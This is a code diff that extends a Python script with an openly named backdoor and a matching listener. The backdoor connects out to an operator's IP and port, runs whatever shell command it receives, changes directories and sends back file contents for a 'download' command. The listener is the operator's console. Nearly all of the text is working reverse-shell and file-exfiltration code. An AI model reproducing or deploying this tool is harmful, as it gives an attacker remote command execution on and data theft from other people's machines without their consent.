@@ -1,6 +1,4 @@
-import optparse
-import socket
-import subprocess
+import optparse, socket, subprocess, json, os
 
 
 class Sender_N_Receiver:
@@ -12,7 +10,7 @@ class Sender_N_Receiver:
         self.listn = self.listener
         if mode == "S":
             self.backd(self.ip, self.port)
-        else:
+        elif mode == "R":
             self.listn(self.ip, self.port)
 
     class backdoor():
@@ -21,25 +19,47 @@ class Sender_N_Receiver:
             self.status = True
             self.ip = ip
             self.port = port
+            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.connection.connect((self.ip, self.port))
             self.make_connection()
+
+        def reliable_send(self, data):
+            json_data = json.dumps(data.decode('utf-8'))
+            self.connection.send(bytes(json_data, 'utf-8'))
+
+        def reliable_recieve(self):
+            result = self.connection.recv(1024)
+            return json.loads(result)
 
         def execute_commands(self, command_given):
             try:
                 return subprocess.check_output(command_given, shell=True)
             except Exception:
-                pass
+                return b"[-]invaid command"
+
+        def change_working_directory(self, path):
+            os.chdir(path)
+            return b"[+]changing working directory to "+bytes(path, 'utf-8')
+
+        def read_files(self, path):
+            with open(path, "rb") as file:
+                return file.read()
 
         def make_connection(self):
-            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            connection.connect((self.ip, self.port))
+            output = ""
             while self.status:
-                command = connection.recv(1024)
-                if command.decode('utf-8') == "close":
+                command = self.reliable_recieve()
+                if command[0] == "close":
                     self.status = False
-                    connection.close()
-                    continue
-                output = self.execute_commands(command.decode('UTF-8'))
-                connection.send(output)
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    output = self.change_working_directory(command[1])
+                elif command[0] == "download":
+                    output = self.read_files(command[1])
+                else:
+                    output = self.execute_commands(command)
+                self.reliable_send(output)
 
     class listener():
 
@@ -47,26 +67,46 @@ class Sender_N_Receiver:
             self.status = True
             self.ip = ip
             self.port = port
-            self.listener_start()
-
-        def listener_start(self):
             listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             listener.bind((self.ip, self.port))
             listener.listen(0)
             print("[+]waiting for connections...")
-            connection, address = listener.accept()
-            print("[+]got connection from " + str(address))
-            while self.status:
-                command = input(">> ")
-                if command == "close":
-                    connection.send(bytes(command, 'utf-8'))
-                    self.status = False
-                    connection.close()
+            self.connection, self.address = listener.accept()
+            print("[+]got connection from " + str(self.address))
+            self.listener_start()
+
+        def reliable_send(self, data):
+            if data[0] == "close":
+                json_data = json.dumps(data)
+                self.connection.send(bytes(json_data, 'utf-8'))
+                self.connection.close()
+                exit()
+            elif data[0] == "download":
+                data = self.read_files(data[1])
+            json_data = json.dumps(data)
+            self.connection.send(bytes(json_data, 'utf-8'))
+
+        def reliable_recieve(self):
+            result = b''
+            while True:
+                try:
+                    result = result + self.connection.recv(1024)
+                    return json.loads(result)
+                except json.decoder.JSONDecodeError:
                     continue
-                connection.send(bytes(command, 'utf-8'))
-                result = connection.recv(1024)
-                print("\n" + result.decode('UTF-8'))
+
+        def read_files(self, path):
+            with open(path, "rb") as file:
+                return file.read()
+
+        def listener_start(self):
+            while True:
+                command = input(">> ")
+                command = command.split(" ")
+                self.reliable_send(command)
+                result = self.reliable_recieve()
+                print("\n" + result)
 
 
 def get_arguments():
